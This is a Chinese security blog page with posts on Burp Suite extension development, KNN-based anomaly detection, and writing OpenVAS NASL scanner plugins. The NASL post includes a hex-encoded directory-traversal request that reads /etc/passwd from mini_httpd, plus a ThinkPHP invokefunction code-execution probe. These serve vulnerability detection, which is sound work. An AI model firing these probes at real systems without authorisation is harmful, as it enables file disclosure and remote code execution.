<span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
     <span class="token comment" spellcheck="true">/*****************构建新的URL**********************/</span>
    newUrl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>newUrlString<span class="token punctuation">)</span><span class="token punctuation">;</span>
    BurpExtender<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"analyzeRequest.newUrl--new :"</span> <span class="token operator">+</span> newUrlString<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）重新发送改变后的URL的请求</p><p>注意重新构建新的Request，这里采用的是buildHttpRequest方法。</p><pre class="line-numbers language-java"><code class="language-java">URL newUrl<span class="token punctuation">;</span>
<span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
     <span class="token comment" spellcheck="true">/*****************构建新的URL**********************/</span>

    <span class="token comment" spellcheck="true">/*****************获取 http service**********************/</span>
    IHttpService service <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getHttpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/*****************发送一个新的请求**********************/</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">buildHttpRequest</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> newRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3-修改body"><a href="#2-3-修改body" class="headerlink" title="2.3 修改body"></a>2.3 修改body</h4><h3 id="3-3-重新构建包"><a href="#3-3-重新构建包" class="headerlink" title="3.3 重新构建包"></a>3.3 重新构建包</h3><p>需要借助IExtensionHelpers接口，创建该接口对象helpers。这里以如下包为例：</p><pre><code>POST /api/v3/search/lucene/ HTTP/1.1
Host: vulners.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://vulners.com/
Content-Type: application/json
Origin: https://vulners.com
Content-Length: 246
Connection: close
Cookie: _ga=GA1.2.166747250.1624591605; _gid=GA1.2.443724840.1624591605; _gat=1

&#123;
&quot;query&quot;:&quot;affectedSoftware.name:nginx AND affectedSoftware.version:\&quot;1.17.7\&quot;&quot;,
&quot;fields&quot;:[&quot;cvss&quot;,&quot;description&quot;,&quot;id&quot;,]
&#125;</code></pre><p>(1)组建header</p><p>header包括Url cookie等信息</p><pre class="line-numbers language-java"><code class="language-java">String VULNERS_API_HOST <span class="token operator">=</span> <span class="token string">"vulners.com"</span><span class="token punctuation">;</span>
String VULNERS_API_PATH <span class="token operator">=</span> <span class="token string">"/api/v3/search/lucene"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//"/api/v3/burp/";</span>
List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"POST "</span> <span class="token operator">+</span> VULNERS_API_PATH  <span class="token operator">+</span> <span class="token string">"/ HTTP/1.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Host: "</span> <span class="token operator">+</span> VULNERS_API_HOST<span class="token punctuation">)</span><span class="token punctuation">;</span>
headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Cookie: xxxxxxx;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）组建body</p><p>首先我们构造出Json结构的body，注意body里可以添加嵌套多层的json。</p><pre class="line-numbers language-java"><code class="language-java">JSONObject jsonBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// Map mapBody = new HashMap();</span>
jsonBody<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"query"</span><span class="token punctuation">,</span> <span class="token string">"affectedSoftware.name:"</span><span class="token operator">+</span>SoftwareName<span class="token operator">+</span><span class="token string">" AND affectedSoftware.version:\""</span><span class="token operator">+</span>SoftwareVersion<span class="token operator">+</span><span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
List<span class="token operator">&lt;</span>String<span class="token operator">></span> fields<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"cvss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
jsonBody<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"fields"</span><span class="token punctuation">,</span>fields<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）发送新请求</p><p>首先使用buildHttpMessage重新构造新的request；再调用makeHttpRequest发送新的请求，获取响应值response。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> request <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">buildHttpMessage</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> helpers<span class="token punctuation">.</span><span class="token function">stringToBytes</span><span class="token punctuation">(</span>jsonBody<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> response <span class="token operator">=</span> callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>VULNERS_API_HOST<span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(4)解析response</p><p>将resposne转化为json格式的报文object，就可以精确的取值啦</p><pre class="line-numbers language-java"><code class="language-java">String responseString <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">bytesToString</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
IResponseInfo iResponseInfo <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
String jsonString <span class="token operator">=</span> responseString<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>iResponseInfo<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
JSONObject object <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>参考连接：</p><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/124593.html#goComment">1.从头开发一个BurpSuite数据收集插件</a></p><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c7b480a28dc6">2.burp插件开发基础一（JAVA篇)</a></p><p><a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/">3.官方插件编写示例</a></p><p><a target="_blank" rel="noopener" href="http://blog.portswigger.net/2012_12_01_archive.html">4官方编写插件博客</a></p><p><a target="_blank" rel="noopener" href="https://github.com/bit4woo/burp-api-drops">5.请求包的所有操作</a> 超级推荐</p><p><a target="_blank" rel="noopener" href="https://t0data.gitbooks.io/burpsuite/content/chapter16.html">6 如何编写自己的burpsuite</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" rel="tag">插件开发</a></li></ul></div><span class="post-count">总字数2.5k</span> <span class="post-count">预计阅读10分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-machine-learning-classify-knn" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/04/26/machine-learning-classify-knn/" class="article-date"><time class="published" datetime="2021-04-26T07:55:26.000Z" itemprop="datePublished">2021-04-26 发布</time> <time class="updated" datetime="2021-06-07T08:57:00.911Z" itemprop="dateUpdated">2021-06-07 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/04/26/machine-learning-classify-knn/">machine-learning-classify-knn</a></h1></header><div class="article-entry" itemprop="articleBody"><p>的函数：</p><p>词频：FreqDist(words_list), 接受list类型的参数，返回词典，key是元素，value是元素出现的次数</p><pre><code>    fdist = FreqDist(dist).keys()
    dist_max=set(fdist[0:50])
    dist_min = set(fdist[-50:])</code></pre><p><strong>set()</strong> 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。</p><pre><code>&gt;&gt;&gt;x = set(&#39;runoob&#39;)
&gt;&gt;&gt; y = set(&#39;google&#39;)
&gt;&gt;&gt; x, y
(set([&#39;b&#39;, &#39;r&#39;, &#39;u&#39;, &#39;o&#39;, &#39;n&#39;]), set([&#39;e&#39;, &#39;o&#39;, &#39;g&#39;, &#39;l&#39;]))   # 重复的被删除</code></pre><h2 id="1-走进KNN"><a href="#1-走进KNN" class="headerlink" title="1 走进KNN"></a>1 走进KNN</h2><h3 id="1-k近邻算法的基本概念，原理以及应用"><a href="#1-k近邻算法的基本概念，原理以及应用" class="headerlink" title="1.k近邻算法的基本概念，原理以及应用"></a>1.k近邻算法的基本概念，原理以及应用</h3><p>KNN（K-nearest neighbor）的基本思想非常的简单朴素，即对于一个待预测的样本x ，在训练集中找到<strong>距离</strong>其最近的k 个近邻 ，得票最高的类作为输出类别即可。当 k=1 时，则称为最近邻。</p><p>KNN常见的算法：<br>·Brute Force<br>·K-D Tree<br>·Ball Tree</p><p><strong>应用：</strong>kNN 可以用来进行分类或者回归</p><h3 id="2-k近邻算法中k的选取，距离的度量以及特征归一化的必要性"><a href="#2-k近邻算法中k的选取，距离的度量以及特征归一化的必要性" class="headerlink" title="2.k近邻算法中k的选取，距离的度量以及特征归一化的必要性"></a>2.k近邻算法中k的选取，距离的度量以及特征归一化的必要性</h3><p><strong>k过大时：</strong></p><p>如果我们选取较大的k值，就相当于用较大邻域中的训练数据进行预测，这时与输入实例较远的（不相似）训练实例也会对预测起作用，使预测发生错误，k值的增大意味着整体模型变得简单。</p><p>我们想，如果k=N（N为训练样本的个数）,那么无论输入实例是什么，都将简单地预测它属于在训练实例中最多的类。这时，模型是不是非常简单，这相当于你压根就没有训练模型呀！</p><p><strong>k过小时：</strong></p><p>如果我们选取较小的k值，那么就会意味着我们的整体模型会变得复杂，容易发生过拟合！</p><p><strong>k的选择：</strong>李航博士书上讲到，我们一般选取一个较小的数值，通常采取 交叉验证法来选取最优的k值。（<strong>也就是说，选取k值很重要的关键是实验调参，类似于神经网络选取多少层这种，通过调整超参数来得到一个较好的结果</strong>）</p><h3 id="3-k近邻法的实现：kd树原理的讲解"><a href="#3-k近邻法的实现：kd树原理的讲解" class="headerlink" title="3.k近邻法的实现：kd树原理的讲解"></a>3.k近邻法的实现：kd树原理的讲解</h3><p>4.kd树详细例子讲解</p><p>5.kd树的不足以及最差情况举例</p><p>6.k近邻方法的一些个人总结</p><h2 id="2-KNN应用1"><a href="#2-KNN应用1" class="headerlink" title="2 KNN应用1"></a>2 KNN应用1</h2><p>2.1 使用KNN检测异常操作</p><p>思路：</p><p>数据处理：</p><p><strong>处理数据：</strong></p><p>50个用户数据；每个用户15000条操作序列，每100条作为一个操作序列，所以每个用户的数据为cmd_list[150X100]，其中每个用户15000条操作序列中统计FreqDist统计最频繁使用的前50个dist_max和 最不频繁使用的后50个dist_min。</p><p>KNN只能以标量作为输入。</p><p><strong>特征：</strong>user_cmd_feature（150X3）</p><p>cmd_list中每个操作序列为cmd_block（100个命令）</p><p>f1：统计cmd_block中不重复命令的个数len(set(cmd_block))</p><p>f2: 统计（cmd_block中最频繁使用的前10个与dist_max）的交集个数（len(set()&amp;set())）</p><p>f3:统计（cmd_block中最不频繁使用的前10个与dist_min）的交集个数（len(set()&amp;set())）</p><p><strong>训练：</strong></p><p>user_cmd_feature[0:120]（120X3）：前120个操作序列作为训练序列，后30个操作序列作为测试序列</p><h1 id="anaconda中创建虚拟环境"><a href="#anaconda中创建虚拟环境" class="headerlink" title="anaconda中创建虚拟环境"></a>anaconda中创建虚拟环境</h1><p>1、用conda创建Python虚拟环境（在conda prompt环境下完成）</p><pre><code>conda create -n douge python=2.7</code></pre><p>(注：该命令只适用于Windows环境；“environment_name”是要创建的环境名；“python=X.X”是选择的Python版本)</p><h3 id="2、激活虚拟环境（在conda-prompt环境下完成）"><a href="#2、激活虚拟环境（在conda-prompt环境下完成）" class="headerlink" title="2、激活虚拟环境（在conda prompt环境下完成）"></a>2、激活虚拟环境（在conda prompt环境下完成）</h3><pre><code>activate douge</code></pre><p>Windows: activate your_env_name(虚拟环境名称)</p><h3 id="3、给虚拟环境安装外部包"><a href="#3、给虚拟环境安装外部包" class="headerlink" title="3、给虚拟环境安装外部包"></a>3、给虚拟环境安装外部包</h3><pre><code>conda install -n douge vulners</code></pre><p>例如: conda install -n tensorflow pandas</p><h3 id="4、查看已有的环境-当前已激活的环境会显示一个星号"><a href="#4、查看已有的环境-当前已激活的环境会显示一个星号" class="headerlink" title="4、查看已有的环境(当前已激活的环境会显示一个星号)"></a>4、查看已有的环境(当前已激活的环境会显示一个星号)</h3><pre><code>conda info -e</code></pre><h3 id="5、删除一个已有的虚拟环境"><a href="#5、删除一个已有的虚拟环境" class="headerlink" title="5、删除一个已有的虚拟环境"></a>5、删除一个已有的虚拟环境</h3><pre><code>conda remove --name your_env_name --all</code></pre><h3 id="6、查看pip的安装目录"><a href="#6、查看pip的安装目录" class="headerlink" title="6、查看pip的安装目录"></a>6、查看pip的安装目录</h3><pre><code>pip list</code></pre><p>7、删除已经安装的模块<br><code>pip uninstall **</code><br>(例如：pip uninstall numpy)</p><p>pycharm配置虚拟环境</p><p><img src="/2021/04/26/machine-learning-classify-knn/1622551543337.png" alt="1622551543337"></p><h1 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h1><p>1 cross_validation等模块弃用</p><p>新的模块sklearn.model_selection，将以前的<code>sklearn.cross_validation</code>, <code>sklearn.grid_search</code> 和 <code>sklearn.learning_curve模块组合到一起</code></p><p>比如：cross_validation模块弃用，所有的包和方法都在model_selection中,包和方法名没有发生变化</p><p>将from sklearn import cross_validation</p><p>改为from sklearn import model_selection</p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" rel="tag">机器学习</a></li></ul></div><span class="post-count">总字数1.1k</span> <span class="post-count">预计阅读4分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-openvas-develop" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/04/07/openvas-develop/" class="article-date"><time class="published" datetime="2021-04-07T09:33:00.000Z" itemprop="datePublished">2021-04-07 发布</time> <time class="updated" datetime="2021-05-24T02:50:41.132Z" itemprop="dateUpdated">2021-05-24 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/04/07/openvas-develop/">openvas-develop</a></h1></header><div class="article-entry" itemprop="articleBody"><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@archery-sec9001 supper-user<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># openvas-nasl -h</span>
Usage:
  openvas-nasl <span class="token punctuation">[</span>OPTION<span class="token punctuation">..</span>.<span class="token punctuation">]</span> NASL_FILE<span class="token punctuation">..</span>. - standalone NASL interpreter <span class="token keyword">for</span> OpenVAS

Help Options:
  -h, --help                          Show <span class="token function">help</span> options

Application Options:
  -V, --version                       Display version information
  -d, --debug                         Output debug information to stderr.
  -D, --description                   Only run the <span class="token string">'description'</span> part of the script
  -B, --both                          Run <span class="token keyword">in</span> description mode before running the script.
  -p, --parse                         Only parse the script, don<span class="token string">'t execute it
  -L, --lint                          '</span>lint<span class="token string">' the script (extended checks)
  -t, --target=&lt;target>               Execute the scripts against &lt;target>
  -T, --trace=&lt;file>                  Log actions to &lt;file> (or '</span>-<span class="token string">' for stderr)
  -c, --config-file=&lt;filename>        Configuration file
  -e, --source-iface=&lt;iface_name>     Source network interface for established connections.
  --vendor-version=&lt;string>           Use &lt;string> as vendor version.
  -s, --safe                          Specifies that the script should be run with '</span>safe checks' enabled
  -X, --disable-signing               Run the script with disabled signature verification
  -i, --include-dir<span class="token operator">=</span><span class="token operator">&lt;</span>dir<span class="token operator">></span>             Search <span class="token keyword">for</span> includes <span class="token keyword">in</span> <span class="token operator">&lt;</span>dir<span class="token operator">></span>
  --debug-tls<span class="token operator">=</span><span class="token operator">&lt;</span>level<span class="token operator">></span>                 Enable TLS debugging at <span class="token operator">&lt;</span>level<span class="token operator">></span>
  -k, --kb<span class="token operator">=</span><span class="token operator">&lt;</span>key<span class="token operator">=</span>value<span class="token operator">></span>                Set KB key to value. Can be used multiple <span class="token function">times</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo.nasl：输出开放的端口</p><pre><code>#
# Check for ssh
#
if(description)
&#123;
        script_name(english:&quot;Ensure the presence of ssh&quot;);
        script_description(english:&quot;This script makes sure that ssh is running&quot;);
        script_summary(english:&quot;connects on remote tcp port 22&quot;);
        script_category(ACT_GATHER_INFO);
        script_family(english:&quot;Administration toolbox&quot;);
        script_copyright(english:&quot;This script was written by Joe U.&quot;);
        script_dependencies(&quot;find_service.nes&quot;);
        exit(0);
&#125;
#start = prompt(&quot;First port to scan ? &quot;);
#end  = prompt(&quot;Last port to scan ? &quot;);

for(i=1;i&lt;9999;i=i+1)
&#123;
        soc = open_sock_tcp(i);
        if(soc)
        &#123;
                display(&quot;Port &quot;, i, &quot; is open\n&quot;);
                close(soc);
        &#125;
&#125;</code></pre><h4 id="Tcp请求"><a href="#Tcp请求" class="headerlink" title="Tcp请求"></a>Tcp请求</h4><pre><code>#漏洞检测
## Variable Initialization
port = 8080;
#mini_httpd默认端口

## Check Port status
if(!get_port_state(port))&#123;
        #这里经过测试一些未开放的端口返回值都是1，如果开放的话返回值就是10000，所以这里其实就可以根据这个返回值做端口检测
    display(&quot;ADog:get_port_state failed.&quot;,port,&quot;\n&quot;);
    exit(0);
&#125;

## Open the socket
sock = open_sock_tcp(port);
if(!sock)&#123;
        #这里其实跟上面是一样的，sock端口其实都能开放的，所以这段可写可不写
    display(&quot;ADog:open_sock_tcp failed.&quot;,port,&quot;\n&quot;);
    exit(0);
&#125;

## Constructed directory traversal crafted request
req = raw_string(0x47, 0x45, 0x54, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x0d, 0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x4d, 0x61, 0x63, 0x69, 0x6e, 0x74, 0x6f, 0x73, 0x68, 0x3b, 0x20, 0x49, 0x6e, 0x74, 0x65, 0x6c, 0x20, 0x4d, 0x61, 0x63, 0x20, 0x4f, 0x53, 0x20, 0x58, 0x20, 0x31, 0x30, 0x2e, 0x31, 0x33, 0x3b, 0x20, 0x72, 0x76, 0x3a, 0x36, 0x33, 0x2e, 0x30, 0x29, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x2f, 0x32, 0x30, 0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x20, 0x46, 0x69, 0x72, 0x65, 0x66, 0x6f, 0x78, 0x2f, 0x36, 0x33, 0x2e, 0x30, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x6d, 0x6c, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x2a, 0x2f, 0x2a, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x7a, 0x68, 0x2d, 0x43, 0x4e, 0x2c, 0x7a, 0x68, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x2c, 0x7a, 0x68, 0x2d, 0x54, 0x57, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x37, 0x2c, 0x7a, 0x68, 0x2d, 0x48, 0x4b, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x35, 0x2c, 0x65, 0x6e, 0x2d, 0x55, 0x53, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x33, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x32, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65, 0x0d, 0x0a, 0x55, 0x70, 0x67, 0x72, 0x61, 0x64, 0x65, 0x2d, 0x49, 0x6e, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x2d, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x73, 0x3a, 0x20, 0x31, 0x0d, 0x0a, 0x0d, 0x0a);
#这里最重要的就是这段poc，由于这是web服务器，因此这的payload，读者可以对这段进行16进制解码，你就会发现其实就是一个web的流量包
#这里我先使用burp做了漏洞复现，然后将请求包复制下来，将其做了一次16进制转化
#这里openvas其实自带http的函数，但是这里我仍然使用了socket，原因就是如果后续不是web的服务，那么web相关的函数就用不了，总的来说socket肯定是最通用的方法

## send the attack request and recieve the response
display(&quot;ADog:port is working.&quot;,port,&quot;\n&quot;);

send(socket:sock, data:req);
ret = recv(socket:sock, length:1024);
#获取返回包内容
close(sock);

#display(&quot;ADog:recv:&quot;,ret);

state = egrep(pattern:&#39;^root.*&#39;,string:ret);
#openvas自带的匹配函数，这里用于匹配出现root字样，由于这个漏洞是任意文件读取，那么这里我读取的是/etc/passwd，那么就会第一条就会出现root用户的基本信息
#那么如果出现了，那么就认定此漏洞存在
#这里的定制化就体现在我们可以针对公司内部漏洞编写nasl脚本，其实仔细看过脚本的人就知道，目前市面上主流的扫描器其实都只是版本匹配，当然这也是为了无损扫描，也有部分payload是真的带poc

if(state)
&#123;
  report = &#39;mini_httpd is vulnerable!\n&#39;;
  security_message(data:report);
  #这里使用openvas自带的报告函数将漏洞输出到扫描报告里
  #security_message(port:port);
  #这两个函数用一个就行了，一开始为了测试使用了这两个，最后报告里也就出现了两次
  display(&#39;mini_httpd is vulnerable.\n&#39;);
&#125;</code></pre><p><a target="_blank" rel="noopener" href="http://foreversong.cn/archives/1333">http://foreversong.cn/archives/1333</a></p><h4 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h4><pre><code># 获取 www 端口，默认为 80
port = get_http_port(default: 80);
str = string(&quot;GET /index.php?s=index/think/app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Tr0y HTTP/1.0\r\n\r\n&quot;);
# 发送 payload 并返回服务器的响应
recv = http_send_recv(port: port, data: str);
# DEBUG 使用，打印返回的 header+body
display(recv, &quot;\n&quot;);</code></pre><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>-X 忽略签名认证</p><p>-t target 目标主机IP/域名</p><p>-i 插件加载目录</p><pre class="line-numbers language-bash"><code class="language-bash">openvas-nasl -i /var/lib/openvas/plugins -Xt 10.27.22.76 demo2.nasl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/07/openvas-develop/1617788073176.png" alt="1617788073176"></p><h4 id="7-测试NASL脚本"><a href="#7-测试NASL脚本" class="headerlink" title="7. 测试NASL脚本"></a>7. 测试NASL脚本</h4><p>将自己写的插件复制到openvas插件库目录：<br>/var/lib/openvas/plugins<br>加载插件:<br>openvassd</p><h4 id="8-重建插件库"><a href="#8-重建插件库" class="headerlink" title="8. 重建插件库"></a>8. 重建插件库</h4><p>openvasmd –rebuild<br>注意：参数“rebuild”代表从一个正在运行的扫描器（openvassd）中重建数据库信息。</p><p>http请求：</p><pre><code>port = get_http_port(default:80);  
host = http_host_name(port:port);  
recv = http_get(port:port, item:&quot;/&quot;);  
